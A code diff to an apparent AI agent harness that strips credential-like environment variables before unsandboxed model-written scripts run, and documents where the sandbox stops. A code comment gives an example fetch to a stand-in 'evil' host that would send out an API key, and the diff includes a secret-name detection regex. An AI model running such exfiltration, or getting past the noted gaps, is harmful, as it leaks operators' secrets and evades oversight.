@@ -21,6 +21,30 @@ const DEFAULT_TIMEOUT_MS = 60_000;
 const MAX_TIMEOUT_MS = 300_000;
 const DEFAULT_MAX_CALLS = 50;
 
+/** Env-var names that carry a credential — stripped before the (unsandboxed)
+ *  script body runs so it can't read/exfiltrate the harness's secrets. Matches
+ *  the common shapes; a project var not matching these still passes (the script
+ *  legitimately needs the project's own env), but the provider/cloud keys the
+ *  HARNESS holds do not leak. */
+const SECRET_ENV_RE =
+  /(?:_KEY|_TOKEN|_SECRET|_PASSWORD|_PASSWD|_CREDENTIAL|APIKEY|PASSWORD|SECRET|^AWS_|^OPENAI_|^ANTHROPIC_|^DEEPSEEK_|^GITHUB_TOKEN|^GH_TOKEN|^NPM_TOKEN|^HF_TOKEN)/iu;
+
+/** A copy of `env` with credential-shaped vars removed. TSFORGE_RPC_* are
+ *  re-added by the caller (the script needs them to reach its tool stubs). */
+function withoutSecretEnv(
+  env: Record<string, string | undefined>
+): Record<string, string | undefined> {
+  const out: Record<string, string | undefined> = {};
+
+  for (const [key, value] of Object.entries(env)) {
+    if (!SECRET_ENV_RE.test(key)) {
+      out[key] = value;
+    }
+  }
+
+  return out;
+}
+
 function envInt(name: string, fallback: number, max: number): number {
   const raw = process.env[name];
   const parsed = raw === undefined ? NaN : Number.parseInt(raw, 10);
@@ -266,11 +290,20 @@ async function runScript(
 /**
  * `script` — run one TypeScript program that calls tools through generated RPC
  * stubs, collapsing a multi-step tool chain into a SINGLE model turn. Every stub
- * call routes back through `executeTool` (deps.execute), so scope, the unified
- * policy, the write-guard, mutation accounting, and the gate all still apply — the
- * model gets ergonomics, not new powers. Only the script's stdout returns to the
- * model. Bounded by a wall-clock timeout, a per-script tool-call cap, and output
- * condensing. NOT offered in plan mode (it can write), and it cannot call itself.
+ * call (`./tsforge-tools`) routes back through `executeTool` (deps.execute), so
+ * scope, the unified policy, the write-guard, mutation accounting, and the gate
+ * all apply to those calls.
+ *
+ * SECURITY: the script BODY itself is UNSANDBOXED — its direct `fs`/`net`/
+ * `child_process`/`Bun.spawn` are ordinary Bun and are NOT policed by
+ * executeTool. Two guards bound that: the policy scans the body for critical
+ * shapes at classify time (best-effort — see codeBodyIsDangerous), and the
+ * body runs with credential-shaped env vars stripped (withoutSecretEnv), so it
+ * cannot exfiltrate the harness's provider/cloud keys. A determined body can
+ * still touch the filesystem outside cwd; treat `script` as trusted-ish
+ * automation, not a sandbox. Only its stdout returns to the model. Bounded by a
+ * wall-clock timeout, a per-script tool-call cap, and output condensing. NOT
+ * offered in plan mode (it can write), and it cannot call itself.
  */
 export async function doScript(
   args: Record<string, unknown>,
@@ -312,7 +345,12 @@ export async function doScript(
       scriptPath,
       ctx.cwd,
       {
-        ...process.env,
+        // The script body is UNSANDBOXED code (its own fs/net/child_process,
+        // not routed through executeTool), so it must not inherit the harness's
+        // secrets: a body of `fetch(evil, {body: process.env.OPENAI_API_KEY})`
+        // would otherwise exfiltrate the provider key. Strip credential-shaped
+        // vars before handing over the env.
+        ...withoutSecretEnv(process.env),
         // The script's stdout is CAPTURED (parsed by the loop, matched in tests),
         // never shown live in a terminal — so any ANSI colorization is corruption,
         // not presentation. Bun colorizes console.log values (e.g. a numeric
